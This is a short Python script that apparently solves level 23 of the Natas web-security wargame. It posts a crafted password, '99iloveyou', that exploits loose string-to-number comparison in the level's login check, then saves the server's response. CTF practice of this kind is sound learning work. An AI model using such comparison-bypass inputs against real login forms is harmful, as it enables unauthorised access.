import requests

import utils

LEVEL = 23
url, auth = utils.get_natas_credentials(LEVEL)

with requests.Session() as session:
    data = {
        "passwd": "99iloveyou",
        "submit": "Login"
    }
    r = requests.post(url, auth=auth, data=data)
    utils.save_file('out.txt', r.text)
